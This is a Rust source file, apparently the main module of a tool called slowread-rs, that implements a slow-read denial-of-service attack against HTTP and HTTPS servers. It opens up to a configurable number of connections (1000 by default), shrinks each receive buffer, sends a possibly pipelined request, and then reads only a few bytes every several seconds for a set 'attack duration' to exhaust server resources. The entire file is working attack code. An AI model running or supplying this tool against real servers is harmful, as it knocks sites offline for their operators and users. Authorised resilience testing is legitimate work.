mod request;

extern crate futures;
extern crate http;
extern crate rand;
#[macro_use]
extern crate structopt;
extern crate native_tls;
extern crate tokio;
extern crate tokio_timer;
extern crate tokio_tls;
extern crate trust_dns_resolver;
extern crate openssl;
extern crate tokio_openssl;

use request::Request;
use tokio_openssl::SslConnectorExt;
use openssl::ssl::{SslConnectorBuilder, SslConnector, SslMethod};
use futures::future::{loop_fn, Future, Loop, ok};
use futures::stream::Stream;
use rand::Rng;
use http::{Request as Req, uri::Scheme};
use tokio::spawn;
use std::net::SocketAddr;
use std::sync::{
    atomic::{AtomicUsize, Ordering},
    Arc,
};
use std::time::{Duration, Instant};
use structopt::StructOpt;
use tokio::io::{self, AsyncRead, AsyncWrite};
use tokio::net::TcpStream;
use tokio::timer::{Delay, Deadline, Interval};

trait AsyncStream: AsyncRead + AsyncWrite + Send {}
impl<T> AsyncStream for T where T: AsyncRead + AsyncWrite + Send {}

#[derive(StructOpt, Debug)]
#[structopt(name = "slowread-rs")]
struct Options {
    /// Address to request
    #[structopt(short = "a", long = "address")]
    address: String,

    /// Number of requests to make, if the server supports HTTP Pipelining
    #[structopt(short = "p", long = "pipeline_factor", default_value = "1")]
    pipeline_factor: usize,

    /// Minimum receive buffer size
    #[structopt(short = "m", long = "min-recv-buffer-size", default_value = "10", parse(from_str = "parse_recv_buffer_size"))]
    min_recv_buffer_size: usize,

    /// Maximum receive buffer size
    #[structopt(short = "M", long = "max-recv-buffer-size", default_value = "20", parse(from_str = "parse_recv_buffer_size"))]
    max_recv_buffer_size: usize,

    /// Bytes to read in a single read 
    #[structopt(short = "r", long = "read-len", default_value = "32")]
    read_len: usize,

    /// Maximum number of open connections at any given time
    #[structopt(short = "c", long = "connections", default_value = "1000")]
    connections: usize,

    /// Interval between read operations in seconds
    #[structopt(short = "w", long = "wait-time", default_value = "5", parse(from_str = "parse_duration"))]
    wait_time: Duration,

    /// Duration of the attack in seconds
    #[structopt(short = "d", long = "attack-duration", default_value = "300", parse(from_str = "parse_duration"))]
    attack_duration: Duration,
}

fn parse_duration(src: &str) -> Duration {
    Duration::from_secs(src.parse().unwrap())
}

fn parse_recv_buffer_size(src: &str) -> usize {
    src.parse::<usize>().unwrap() / 2
}


fn main() {
    let options = Options::from_args();

    let request = Request::new(&options.address, options.pipeline_factor);

    let host = request.host().to_string();
    println!("Connecting to \"{}\"", host);

    tokio::run(launch_attacks(request, options));
}

fn launch_attacks(
    request: Request,
    options: Options,
    )-> impl Future<Item = (), Error = ()> {

    let open_connections = Arc::new(AtomicUsize::new(0));
    let attack_duration = options.attack_duration;
    let start_time = Instant::now();
    let sock_addr = request.sock_addr().clone();
    let scheme = request.scheme().clone();
    let host = Arc::new(request.host().to_string());
    let request = Arc::new(request.request_str().to_string());

    let interval = 
        Interval::new(start_time, Duration::from_secs(1))
        .for_each(move |instant| {
            while open_connections.load(Ordering::SeqCst) < options.connections {
                spawn(launch_attack(
                        host.clone(),
                        &sock_addr,
                        &scheme,
                        &request,
                        &options,
                        open_connections.clone(),
                        ));
            }

            print_stats(instant.duration_since(start_time).as_secs(), &open_connections);

            ok(())
        });

    Deadline::new(interval, Instant::now() + attack_duration)
        .map_err(|_| ())
}

fn print_stats(secs_since_start: u64, open_connections: &Arc<AtomicUsize>) {
    println!("Time: {}s\nOpen connections: {}\n\n", secs_since_start, open_connections.load(Ordering::SeqCst));
}


fn launch_attack(
    host: Arc<String>,
    socket_addr: &SocketAddr,
    scheme: &Scheme,
    request: &str,
    options: &Options,
    open_connections: Arc<AtomicUsize>,
    ) -> impl Future<Item = (), Error = ()> {
    let mut rng = rand::thread_rng();
    let wait_time = options.wait_time;
    let read_len = options.read_len;
    let recv_buffer_size = rng.gen_range(options.min_recv_buffer_size, options.max_recv_buffer_size);
    let request = request.to_string();
    let scheme = scheme.clone();

    open_connections.fetch_add(1, Ordering::SeqCst);
    let err_open_conns = open_connections.clone();
    let err_open_conns_2 = open_connections.clone();

    TcpStream::connect(&socket_addr)
        .map_err(move |e| {
            err_open_conns.fetch_sub(1, Ordering::SeqCst);
            println!("{:?}", e);
        }).and_then(move |tcp_stream| {

        tcp_stream
            .set_recv_buffer_size(recv_buffer_size)
            .unwrap();

        if scheme == Scheme::HTTPS {
            let builder = SslConnector::builder(SslMethod::tls()).unwrap();

            Box::new(SslConnectorExt::connect_async(&SslConnectorBuilder::build(builder), &host, tcp_stream)
                .map_err(move |e| {
                    err_open_conns_2.fetch_sub(1, Ordering::SeqCst);
                    println!("{:?}", e);
                }).and_then(move |tcp_stream| {
                    ok(Box::new(tcp_stream) as Box<AsyncStream + Send>)
                })) as Box<Future<Item = Box<AsyncStream + Send>, Error = ()> + Send>
        } else {
            Box::new(ok(Box::new(tcp_stream) as Box<AsyncStream + Send>)) as Box<Future<Item=Box<AsyncStream + Send>, Error = ()> + Send>
        }

    }).and_then(move |tcp_stream| {
        io::write_all(tcp_stream, request)
            .map_err(|e| println!("{:?}", e))

    }).and_then(move |(tcp_stream, _)| {
        loop_fn(tcp_stream, move |tcp_stream| {
            let mut buf: Vec<u8> = Vec::with_capacity(read_len);
            buf.resize(read_len, 0);

            io::read_exact(tcp_stream, buf)
                .then(move |res| {
                    let (wait_time, value) = match res {
                        Err(_) => (Duration::from_secs(0), ok(Loop::Break(()))),
                        Ok((tcp_stream, _buf)) => (wait_time, ok(Loop::Continue(tcp_stream)))
                        };

                    Delay::new(Instant::now() + wait_time)
                        .map_err(|e| println!("{:?}", e))
                        .and_then(|_| value)
                })
        })
    })
}
